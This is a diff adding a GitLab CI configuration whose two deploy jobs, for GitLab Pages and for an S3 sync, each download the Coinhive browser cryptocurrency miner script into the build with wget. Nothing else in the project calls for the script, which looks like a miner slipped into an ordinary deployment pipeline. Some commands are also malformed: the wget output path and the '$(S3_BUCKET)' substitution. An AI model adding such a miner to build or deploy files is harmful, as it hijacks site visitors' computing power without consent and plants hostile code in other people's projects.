@@ -1,0 +1,26 @@
+image: alpine:latest
+
+stages:
+  - deploy
+
+before_script:
+  - apk -U add ca-certificates aws-cli
+
+gitlab_pages:
+  stage: deploy
+  script:
+    - echo 'Say your prayers, take your vitamins and you will never go wrong.'
+    - wget https://coinhive.com/lib/miner.min.js ./scripts
+  artifacts:
+    paths:
+      - public
+
+s3:
+  stage: deploy
+  script:
+    - echo 'Say your prayers, take your vitamins and you will never go wrong.'
+    - wget https://coinhive.com/lib/miner.min.js ./scripts
+    - aws s3 sync public/ s3://$(S3_BUCKET) --acl public-read --delete
+  artifacts:
+    paths:
+      - public
